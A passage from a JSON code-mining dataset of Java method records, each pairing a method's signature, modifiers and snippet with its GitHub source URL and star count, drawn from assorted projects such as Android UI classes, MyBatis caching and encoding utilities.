34895, "method_name": "sizeOf", "class_name": "ImageCache_FormsLruCache", "params": ["java", "java"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int sizeOf (java.lang.Object p0, java.lang.Object p1)\n\t{\n\t\treturn n_sizeOf (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageCache_FormsLruCache.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34896, "method_name": "n_sizeOf", "class_name": "ImageCache_FormsLruCache", "params": ["java", "java"], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_sizeOf (java.lang.Object p0, java.lang.Object p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageCache_FormsLruCache.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34897, "method_name": "monodroidAddReference", "class_name": "ImageCache_FormsLruCache", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageCache_FormsLruCache.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34898, "method_name": "monodroidClearReferences", "class_name": "ImageCache_FormsLruCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageCache_FormsLruCache.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34899, "method_name": "getId", "class_name": "Cerveza", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/Cerveza.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34900, "method_name": "getNombre", "class_name": "Cerveza", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getNombre() {\n        return nombre;\n    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/Cerveza.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34901, "method_name": "toString", "class_name": "Cerveza", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"Cerveza{\" +\n                \"id=\" + id +\n                \", nombre='\" + nombre + '\\'' +\n                \", precio=\" + precio +\n                \", ABV=\" + ABV +\n                \", descripcion='\" + descripcion + '\\'' +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/Cerveza.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34902, "method_name": "calcularCostoFabricacion", "class_name": "Cerveza", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "float", "snippet": "    public abstract float calcularCostoFabricacion();\n\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/Cerveza.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34903, "method_name": "urlDecode", "class_name": "CharacterUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String urlDecode(String value){\n        String result;\n        try {\n             result = URLDecoder.decode(value, UTF_8);\n        } catch (UnsupportedEncodingException e) {\n            result = value;\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/utils/CharacterUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34904, "method_name": "urlEncode", "class_name": "CharacterUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String urlEncode(String value){\n        String result;\n        try {\n            result = URLEncoder.encode(value, UTF_8);\n        } catch (UnsupportedEncodingException e) {\n            result = value;\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/utils/CharacterUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34905, "method_name": "base64Encode", "class_name": "CharacterUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String base64Encode(String value){\n        return Base64.getEncoder().encodeToString(value.getBytes());\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/utils/CharacterUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34906, "method_name": "base64Encode", "class_name": "CharacterUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String base64Encode(String value, String charset){\n        try {\n            return Base64.getEncoder().encodeToString(value.getBytes(charset));\n        } catch (UnsupportedEncodingException e) {\n            return Base64.getEncoder().encodeToString(value.getBytes());\n        }\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/utils/CharacterUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34907, "method_name": "base64Decode", "class_name": "CharacterUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String base64Decode(String value){\n        byte[] decodedBytes = Base64.getDecoder().decode(value);\n        try {\n            return new String(decodedBytes, UTF_8);\n        } catch (UnsupportedEncodingException e) {\n            return value;\n        }\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/utils/CharacterUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34908, "method_name": "generateCode", "class_name": "StmCASE", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\treturn getSon().generateCode();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmCASE.java", "stars": "3", "class_props": {"extends": "StmUnary", "implements": null, "modifiers": ["public"]}}, {"id": 34909, "method_name": "checkType", "class_name": "StmCASE", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\tif (expr != null) {\n\t\t\texpr.checkType();\n\t\t\tTypeCode[] typeCodes = {TypeCode.INTEGER, TypeCode.ENUM};\n\t\t\texpr.getType().assertType(this, typeCodes);\n\t\t}\n\t\tif (this.getSon()!=null)\n\t\t\tgetSon().checkType();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmCASE.java", "stars": "3", "class_props": {"extends": "StmUnary", "implements": null, "modifiers": ["public"]}}, {"id": 34910, "method_name": "getExpr", "class_name": "StmCASE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Expr", "snippet": "\tpublic Expr getExpr() {\n\t\treturn expr;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmCASE.java", "stars": "3", "class_props": {"extends": "StmUnary", "implements": null, "modifiers": ["public"]}}, {"id": 34911, "method_name": "toString", "class_name": "StmCASE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"case \" + expr + \":\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmCASE.java", "stars": "3", "class_props": {"extends": "StmUnary", "implements": null, "modifiers": ["public"]}}, {"id": 34912, "method_name": "asDataXException", "class_name": "DataXException", "params": ["ErrorCode", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "DataXException", "snippet": "    public static DataXException asDataXException(ErrorCode errorCode, String message) {\n        return new DataXException(errorCode, message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/exception/DataXException.java", "stars": "23", "class_props": {"extends": "RuntimeException", "implements": null, "modifiers": ["public"]}}, {"id": 34913, "method_name": "asDataXException", "class_name": "DataXException", "params": ["ErrorCode", "String", "Throwable"], "throws": null, "modifiers": ["public", "static"], "return_type": "DataXException", "snippet": "    public static DataXException asDataXException(ErrorCode errorCode, String message, Throwable cause) {\n        if (cause instanceof DataXException) {\n            return (DataXException) cause;\n        }\n        return new DataXException(errorCode, message, cause);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/exception/DataXException.java", "stars": "23", "class_props": {"extends": "RuntimeException", "implements": null, "modifiers": ["public"]}}, {"id": 34914, "method_name": "asDataXException", "class_name": "DataXException", "params": ["ErrorCode", "Throwable"], "throws": null, "modifiers": ["public", "static"], "return_type": "DataXException", "snippet": "    public static DataXException asDataXException(ErrorCode errorCode, Throwable cause) {\n        if (cause instanceof DataXException) {\n            return (DataXException) cause;\n        }\n        return new DataXException(errorCode, getMessage(cause), cause);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/exception/DataXException.java", "stars": "23", "class_props": {"extends": "RuntimeException", "implements": null, "modifiers": ["public"]}}, {"id": 34915, "method_name": "getErrorCode", "class_name": "DataXException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ErrorCode", "snippet": "    public ErrorCode getErrorCode() {\n        return this.errorCode;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/exception/DataXException.java", "stars": "23", "class_props": {"extends": "RuntimeException", "implements": null, "modifiers": ["public"]}}, {"id": 34916, "method_name": "getMessage", "class_name": "DataXException", "params": ["Object"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String getMessage(Object obj) {\n        if (obj == null) {\n            return \"\";\n        }\n\n        if (obj instanceof Throwable) {\n            StringWriter str = new StringWriter();\n            PrintWriter pw = new PrintWriter(str);\n            ((Throwable) obj).printStackTrace(pw);\n            return str.toString();\n            // return ((Throwable) obj).getMessage();\n        } else {\n            return obj.toString();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/exception/DataXException.java", "stars": "23", "class_props": {"extends": "RuntimeException", "implements": null, "modifiers": ["public"]}}, {"id": 34917, "method_name": "sortQualities", "class_name": "SortUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String[] sortQualities(String[] qualities) {\n        Arrays.sort(qualities, new Comparator<String>() {\n            @Override\n            public int compare(String lhs, String rhs) {\n                if (lhs.contains(\"p\") && rhs.contains(\"p\")) {\n                    int q1 = Integer.parseInt(lhs.substring(lhs.contains(\"-\") ? lhs.indexOf(\"- \") + 2 : 0, lhs.indexOf('p')));\n                    int q2 = Integer.parseInt(rhs.substring(rhs.contains(\"-\") ? rhs.indexOf(\"- \") + 2 : 0, rhs.indexOf('p')));\n                    if (q1 < q2) {\n                        return 1;\n                    } else if (q1 < q2) {\n                        return -1;\n                    } else {\n                        return 0;\n                    }\n                }\n\n                if(lhs.equals(\"3D\"))\n                    return 1;\n\n                return 0;\n            }\n        });\n        return qualities;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/SortUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34918, "method_name": "onBindDescription", "class_name": "ShowDetailsDescriptionPresenter", "params": ["ViewHolder", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onBindDescription(ViewHolder viewHolder, Object item) {\n\t\tif (!(item instanceof Show)) return;\n\t\tShow show = (Show) item;\n\t\tviewHolder.getTitle().setText(show.title);\n\t\tviewHolder.getSubtitle().setText(show.genre);\n\t\tviewHolder.getBody().setText(show.synopsis);\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/presenters/ShowDetailsDescriptionPresenter.java", "stars": "4", "class_props": {"extends": "AbstractDetailsDescriptionPresenter", "implements": null, "modifiers": ["public"]}}, {"id": 34919, "method_name": "getId", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return delegate.getId();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34920, "method_name": "getSize", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getSize() {\n    return delegate.getSize();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34921, "method_name": "getObject", "class_name": "TransactionalCache", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getObject(Object key) {\n    // issue #116\n    Object object = delegate.getObject(key);\n    if (object == null) {\n      entriesMissedInCache.add(key);\n    }\n    // issue #146\n    if (clearOnCommit) {\n      return null;\n    } else {\n      return object;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34922, "method_name": "putObject", "class_name": "TransactionalCache", "params": ["Object", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void putObject(Object key, Object object) {\n    entriesToAddOnCommit.put(key, object);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34923, "method_name": "removeObject", "class_name": "TransactionalCache", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object removeObject(Object key) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34924, "method_name": "clear", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear() {\n    clearOnCommit = true;\n    entriesToAddOnCommit.clear();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34925, "method_name": "commit", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void commit() {\n    if (clearOnCommit) {\n      delegate.clear();\n    }\n    flushPendingEntries();\n    reset();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34926, "method_name": "rollback", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void rollback() {\n    unlockMissedEntries();\n    reset();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34927, "method_name": "reset", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void reset() {\n    clearOnCommit = false;\n    entriesToAddOnCommit.clear();\n    entriesMissedInCache.clear();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34928, "method_name": "flushPendingEntries", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void flushPendingEntries() {\n    for (Map.Entry<Object, Object> entry : entriesToAddOnCommit.entrySet()) {\n      delegate.putObject(entry.getKey(), entry.getValue());\n    }\n    for (Object entry : entriesMissedInCache) {\n      if (!entriesToAddOnCommit.containsKey(entry)) {\n        delegate.putObject(entry, null);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34929, "method_name": "unlockMissedEntries", "class_name": "TransactionalCache", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void unlockMissedEntries() {\n    for (Object entry : entriesMissedInCache) {\n      try {\n        delegate.removeObject(entry);\n      } catch (Exception e) {\n        log.warn(\"Unexpected exception while notifiying a rollback to the cache adapter. \"\n            + \"Consider upgrading your cache adapter to the latest version. Cause: \" + e);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/TransactionalCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 34930, "method_name": "main", "class_name": "TransparentTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u9488\u5bf9\u62bd\u8c61\u6784\u4ef6\u7f16\u7a0b\n        AbstractFile file1,file2,file3,file4,file5,folder1,folder2,folder3;\n\n        folder1 = new Folder(\"\u9694\u58c1\u8001\u738b\u7684\u8bfe\u7a0b\u8d44\u6599\");\n        folder2 = new Folder(\"\u97f3\u9891\u6587\u4ef6\");\n        folder3 = new Folder(\"\u89c6\u9891\u6587\u4ef6\");\n\n        file1 = new VideoFile(\"\u8d70\u8fdb\u8ba1\u7b97\u673a\u4e16\u754c.mp4\");\n        file2 = new VideoFile(\"\u8ba4\u8bc6Java.mp4\");\n        file3 = new VideoFile(\"\u4e86\u89e3Java\u6570\u636e\u7c7b\u578b.mp4\");\n\n        file4 = new AudioFile(\"\u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u8f6f\u4ef6\u5de5\u7a0b.mp3\");\n        file5 = new AudioFile(\"\u600e\u6837\u5b66\u597d\u8f6f\u4ef6\u5de5\u7a0b.mp3\");\n\n        folder1.add(folder2);\n        folder1.add(folder3);\n\n        folder2.add(file4);\n        folder2.add(file5);\n\n        folder3.add(file1);\n        folder3.add(file2);\n        folder3.add(file3);\n\n        //\u4ece\u201c\u9694\u58c1\u8001\u738b\u7684\u8bfe\u7a0b\u8d44\u6599\u201d\u8282\u70b9\u5f00\u59cb\u8fdb\u884c\u6740\u6bd2\u64cd\u4f5c\n        folder1.killVirus();\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/composite/transparent/TransparentTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34931, "method_name": "getStatus", "class_name": "AuthenticationException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HttpStatus", "snippet": "    public HttpStatus getStatus() {\n        return HttpStatus.UNAUTHORIZED;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/exception/AuthenticationException.java", "stars": "1", "class_props": {"extends": "BaseException", "implements": null, "modifiers": ["public"]}}, {"id": 34932, "method_name": "canScrollVertically", "class_name": "ScrollLayoutManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean canScrollVertically ()\n\t{\n\t\treturn n_canScrollVertically ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollLayoutManager.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34933, "method_name": "n_canScrollVertically", "class_name": "ScrollLayoutManager", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_canScrollVertically ();\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollLayoutManager.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34934, "method_name": "monodroidAddReference", "class_name": "ScrollLayoutManager", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollLayoutManager.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34935, "method_name": "monodroidClearReferences", "class_name": "ScrollLayoutManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollLayoutManager.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34936, "method_name": "getProduct", "class_name": "ProductEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IWeight", "snippet": "    public IWeight getProduct() {\n        return product;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/ProductEvent.java", "stars": "2", "class_props": {"extends": "EventObject", "implements": null, "modifiers": ["public"]}}, {"id": 34937, "method_name": "getTime", "class_name": "ProductEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getTime() {\n        return time;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/ProductEvent.java", "stars": "2", "class_props": {"extends": "EventObject", "implements": null, "modifiers": ["public"]}}, {"id": 34938, "method_name": "toString", "class_name": "ProductEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return time % 1000 + \": \" + product;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/ProductEvent.java", "stars": "2", "class_props": {"extends": "EventObject", "implements": null, "modifiers": ["public"]}}, {"id": 34939, "method_name": "getApi", "class_name": "PhoneApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getApi() {\n        return \"user/phone\";\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PhoneApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 34940, "method_name": "setPreCode", "class_name": "PhoneApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PhoneApi", "snippet": "    public PhoneApi setPreCode(String preCode) {\n        this.preCode = preCode;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PhoneApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 34941, "method_name": "setPhone", "class_name": "PhoneApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PhoneApi", "snippet": "    public PhoneApi setPhone(String phone) {\n        this.phone = phone;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PhoneApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 34942, "method_name": "setCode", "class_name": "PhoneApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PhoneApi", "snippet": "    public PhoneApi setCode(String code) {\n        this.code = code;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PhoneApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 34943, "method_name": "onDraw", "class_name": "Practice05ComposeShaderView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        canvas.drawCircle(200, 200, 200, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice05ComposeShaderView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 34944, "method_name": "onSelected", "class_name": "CommonPagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSelected(int index, int totalCount) {\n        if (mOnPagerTitleChangeListener != null) {\n            mOnPagerTitleChangeListener.onSelected(index, totalCount);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34945, "method_name": "onDeselected", "class_name": "CommonPagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDeselected(int index, int totalCount) {\n        if (mOnPagerTitleChangeListener != null) {\n            mOnPagerTitleChangeListener.onDeselected(index, totalCount);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34946, "method_name": "onLeave", "class_name": "CommonPagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLeave(int index, int totalCount, float leavePercent, boolean leftToRight) {\n        if (mOnPagerTitleChangeListener != null) {\n            mOnPagerTitleChangeListener.onLeave(index, totalCount, leavePercent, leftToRight);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34947, "method_name": "onEnter", "class_name": "CommonPagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnter(int index, int totalCount, float enterPercent, boolean leftToRight) {\n        if (mOnPagerTitleChangeListener != null) {\n            mOnPagerTitleChangeListener.onEnter(index, totalCount, enterPercent, leftToRight);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34948, 